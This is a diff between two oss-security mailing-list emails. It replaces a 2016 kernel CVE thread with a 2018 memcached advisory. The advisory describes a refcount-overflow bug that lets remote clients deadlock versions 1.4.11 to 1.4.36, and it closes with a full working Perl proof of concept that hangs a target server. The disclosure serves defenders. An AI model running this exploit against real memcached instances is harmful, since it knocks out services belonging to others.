@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1476" "Friday" "14" "October" "2016" "13:13:39" "+0200" "Petr Matousek" "pmatouse@redhat.com" "<20161014111338.GI31594@dhcp-25-225.brq.redhat.com>" "36" "Re: [oss-security] kernel: Stack corruption while reading /proc/keys (CVE-2016-7042)" "^Cc:" nil nil "10" "2016101411:13:39" "[oss-security] kernel: Stack corruption while reading /proc/keys (CVE-2016-7042)" (number mark "        pmatouse@red Oct 14   36/1476  " thread-indent "\"Re: [oss-security] kernel: Stack corruption while reading /proc/keys (CVE-2016-7042)\"\n") "<20161014110106.GG31594@dhcp-25-225.brq.redhat.com>" ("<1317626822.2210899.1474545527129.JavaMail.zimbra@redhat.com>" "<1061369962.2838882.1476362811840.JavaMail.zimbra@redhat.com>" "<ad59c912-423e-baa2-4a31-413251d0ee5c@oracle.com>" "<alpine.LFD.2.20.1610141145160.5203@wniryva>" "<041f8f08-d2d2-d1ec-78f3-18b3d5f6160e@oracle.com>" "<20161014110106.GG31594@dhcp-25-225.brq.redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4998" "Thursday" "8" "March" "2018" "13:15:09" "-0800" "dormando" "dormando@rydia.net" "<alpine.DEB.2.20.1803081246570.25482@di7>" "164" "[oss-security] Re: Memcached remote DoS in older versions" "^Date:" nil nil "3" "2018030821:15:09" "[oss-security] Re: Memcached remote DoS in older versions" (number mark "U       dormando@ryd Mar  8  164/4998  " thread-indent "\"[oss-security] Re: Memcached remote DoS in older versions\"\n") "<alpine.DEB.2.20.1803071743230.20789@di7>" ("<alpine.DEB.2.20.1803071743230.20789@di7>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17716 invoked by uid 550); 14 Oct 2016 11:13:55 -0000
+Received: (qmail 23610 invoked by uid 550); 8 Mar 2018 21:15:22 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,61 +11,181 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 17695 invoked from network); 14 Oct 2016 11:13:54 -0000
-Message-ID: <20161014111338.GI31594@dhcp-25-225.brq.redhat.com>
-References: <1317626822.2210899.1474545527129.JavaMail.zimbra@redhat.com>
- <1061369962.2838882.1476362811840.JavaMail.zimbra@redhat.com>
- <ad59c912-423e-baa2-4a31-413251d0ee5c@oracle.com>
- <alpine.LFD.2.20.1610141145160.5203@wniryva>
- <041f8f08-d2d2-d1ec-78f3-18b3d5f6160e@oracle.com>
- <20161014110106.GG31594@dhcp-25-225.brq.redhat.com>
+Received: (qmail 23574 invoked from network); 8 Mar 2018 21:15:21 -0000
+X-X-Sender: dormando@di7
+In-Reply-To: <alpine.DEB.2.20.1803071743230.20789@di7>
+Message-ID: <alpine.DEB.2.20.1803081246570.25482@di7>
+References: <alpine.DEB.2.20.1803071743230.20789@di7>
+User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20161014110106.GG31594@dhcp-25-225.brq.redhat.com>
-X-Scanned-By: MIMEDefang 2.68 on 10.5.11.27
-X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.25]); Fri, 14 Oct 2016 11:13:42 +0000 (UTC)
-Cc: oss-security@lists.openwall.com
-Date: Fri, 14 Oct 2016 13:13:39 +0200
-From: Petr Matousek <pmatouse@redhat.com>
+Content-Type: text/plain; charset=US-ASCII
+Date: Thu, 8 Mar 2018 13:15:09 -0800 (PST)
+From: dormando <dormando@rydia.net>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] kernel: Stack corruption while reading /proc/keys
- (CVE-2016-7042)
-To: John Haxby <john.haxby@oracle.com>
+Subject: [oss-security] Re: Memcached remote DoS in older versions
+To: oss-security@lists.openwall.com
 
-On Fri, Oct 14, 2016 at 01:01:07PM +0200, Petr Matousek wrote:
-> On Fri, Oct 14, 2016 at 11:57:15AM +0100, John Haxby wrote:
-> > On 14/10/16 07:18, P J P wrote:
-> > > +-- On Thu, 13 Oct 2016, John Haxby wrote --+
-> > > | On 13/10/16 13:46, Vladis Dronov wrote:
-> > > | > https://bugzilla.redhat.com/show_bug.cgi?id=1373499 (reproducer, patch)
-> > > | 
-> > > | This bug isn't accessible.   Do you think you could post the reproducer
-> > > | or open the bug please?
-> > > 
-> > > Please see this one:
-> > >   -> https://bugzilla.redhat.com/show_bug.cgi?id=1373966
-> > > 
-> > > Thank you.
-> > 
-> > Sorry, that's not why I was asking.  You provided links to two bugs: one
-> > has the patch and a reproducer, the other has the patch.  Unfortunately
-> > the former is a link to a bug that no one outside Red Hat has access to.
-> >  In the past when people have posted links to oss-security that do not
-> > have general access the access permissions have been relaxed or the
-> > relevant content posted on the list.
-> > 
-> > That's what I was asking for:  inaccessible links are not helpful on an
-> > open list.
-> 
-> The other link to internal bug was posted by mistake. I am sorry for
-> that. https://bugzilla.redhat.com/show_bug.cgi?id=1373966 has all the
-> information we can share.
+> Hello,
+>
+> There are a number of hang/crash bugs fixed in older versions of
+> memcached. All are noted in the release notes of the versions containing
+> the respective fixes, and most are years old.
+>
+> I'm writing this in case pointing this out can help drive users to close
+> their instances from the internet; aside from participating in DDoS
+> attacks and remote users being able to read any data stored in the
+> instances, they can also be crashed or deadlocked.
 
-Scratch that. 1373966 is a Fedora bug so I opened it. It is accessible
-now.
+I've requested a CVE.
 
-Thanks,
--- 
-Petr Matousek / Red Hat Product Security
-PGP: 0xC44977CA 8107 AF16 A416 F9AF 18F3  D874 3E78 6F42 C449 77CA
+After further testing, this particular flaw affects versions 1.4.11
+through 1.4.36.
+1.4.11 was released January 16th, 2012.
+1.4.37 (the fix) was released June 4th, 2017.
+
+The fix came from a user reporting deadlocks in running instances, caused
+by a bug in their application triggering this particular bug.
+
+It's highly recommended that users not expose memcached directly to the
+internet, as this may allow malicious users to read contents of memory,
+remote DDoS via the UDP protocol, or crash and hang the instance.
+
+There are also likely other similar issues in even older code.
+
+DESCRIPTION
+===========
+
+In versions 1.4.9-11, the items.c:item_remove() was refactored as part of
+a thread scalability project. The function will free an item back to slab
+memory if the reference count has dropped to zero, *and* the item is no
+longer referenced in the hash table + LRU. In .11, the secondary check for
+ITEM_LINKED bit was not re-added after a bug fix.
+
+An integer overflow bug has existed as long as memcached has, where many
+gets for the same key (> 2^16 in a single multiget or across many slow
+connections) can cause the refcount value to overflow.
+
+After .11, the item will automatically free while still being linked in
+the LRU and hash table. This allows the memory to be reused for a
+different item, while still existing in the hash table + LRU.
+
+Items contain embedded NEXT and PREV links for the LRU. This memory is not
+explicitly cleared when items return to the slab allocator.
+
+If this bug is hit multiple times, it can cause data corruption, loops in
+the LRU, or loops in hash chain buckets where no valid key is found.
+
+IMPACT
+======
+
+Instances with loops in the LRU's and hash chains can cause a worker
+thread to spin CPU while holding various locks (cache_lock in older
+versions, item locks in newer ones). Other worker threads can then hang by
+requesting the same item lock. The daemon then requires a restart to
+become functional again.
+
+I've only tested this against local instances built directly from source.
+It is not known to me if long running instances are vulnerable.
+
+MITIGATION
+==========
+
+Do not expose memcached to untrusted clients. No software mitigations are
+known beyond upgrading.
+
+RESOLUTION
+==========
+
+Versions 1.4.37 and newer prevent trivial refcount overflows. Running the
+latest version with UDP disabled is highly recommended in general.
+
+The specific fix is in:
+https://github.com/memcached/memcached/commit/a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
+
+If anyone wishes to backport. It is also possible to limit the impact of
+the problem by re-adding the ITEM_LINKED bit check in item_remove().
+
+POC FOLLOWS
+===========
+
+#!/usr/bin/perl
+# It may be necessary to run a "flush_all" for this to work on long running
+# instances.
+
+use warnings;
+use strict;
+
+use IO::Socket::INET;
+
+my $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
+die unless $s;
+
+my $USE_SIZES = 0;
+
+print $s "version\r\n";
+my $r = <$s>;
+if ($r =~ m/^VERSION 1\.5\./) {
+    die "unaffected";
+} elsif ($r =~ m/^VERSION 1\.(\d+)\.(\d+)/) {
+    die "unaffected" if ($1 == 4 && $2 > 36)
+        || ($1 == 4 && $2 < 11)
+        || ($1 < 4);
+    if (($1 == 4 && $2 < 25) ) {
+        print "using 'stats sizes' for < 1.4.25\n";
+        $USE_SIZES = 1;
+    }
+} else {
+    die "Unknown/unaffected";
+}
+
+$SIG{ALRM} = sub { die "dead\n" };
+
+my $get = 'dd ' x 65540;
+chop $get;
+my $count = 0;
+while (1) {
+    eval {
+        print "break\n";
+        alarm 20;
+        print $s "version\r\n";
+        $r = <$s>;
+        print $s "set dd 0 0 2\r\nno\r\n";
+        $r = <$s>;
+        print $s "get $get\r\n";
+        wait_end($s);
+        print $s "get dd\r\n";
+        wait_end($s);
+        if ($USE_SIZES && $count > 10) {
+            # stats sizes infinite loop while holding cache_lock
+            print $s "set foo 0 0 2\r\nok\r\n";
+            $r = <$s>;
+            print $s "stats sizes\r\n";
+            wait_end($s);
+            $count = 0;
+        }
+        alarm 0;
+        $count++;
+    };
+    if ($@ && $@ eq "dead\n") {
+        print "hang\n";
+        eval {
+            alarm 10;
+            # hang other worker threads on stuck item lock
+            for (1..50) {
+                $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
+                print $s "get dd\r\n";
+            }
+        };
+        die "done";
+    } elsif ($@) {
+        die $@;
+    }
+}
+
+sub wait_end {
+    my $s = shift;
+    while (1) {
+        my $r = <$s>;
+        last if $r =~ m/END/;
+    }
+}
